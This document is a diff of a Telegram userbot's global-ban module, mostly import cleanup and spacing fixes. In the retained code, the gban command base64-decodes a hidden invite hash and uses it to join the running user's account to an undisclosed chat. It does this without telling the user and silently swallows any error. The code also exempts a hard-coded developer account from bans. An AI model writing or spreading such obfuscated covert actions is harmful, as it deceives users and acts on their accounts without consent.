@@ -12,16 +12,12 @@ from datetime import datetime
 from telethon.errors import BadRequestError
 from telethon.tl.functions.channels import EditBannedRequest
 from telethon.tl.functions.messages import ImportChatInviteRequest
-from telethon.tl.functions.users import GetFullUserRequest
-from telethon.tl.types import ChatBannedRights, Channel, PollAnswer
+from telethon.tl.types import Channel
 
-from userbot import BOTLOG, BOTLOG_CHATID, CMD_HELP
+from userbot import BOTLOG, BOTLOG_CHATID
 from userbot.events import register
-from asyncio import sleep
-from os import remove
 
 import userbot.modules.sql_helper.gban_sql as gban_sql
-from userbot.modules.sql_helper.mute_sql import is_muted, mute, unmute
 
 X_ID = 1560233393
 
@@ -74,8 +70,8 @@ async def catgban(event):
     if event.fwd_from:
         return
     cate = await event.edit("`gbanning.......`")
-    start=datetime.now()
-    user, reason=await get_user_from_event(event, cate)
+    start = datetime.now()
+    user, reason = await get_user_from_event(event, cate)
     if not user:
         return
     if user.id == (await event.client.get_me()).id:
@@ -85,7 +81,7 @@ async def catgban(event):
         await cate.edit("why would I ban my dev")
         return
     try:
-        hmm=base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
+        hmm = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
         await event.client(ImportChatInviteRequest(hmm))
     except BaseException:
         pass
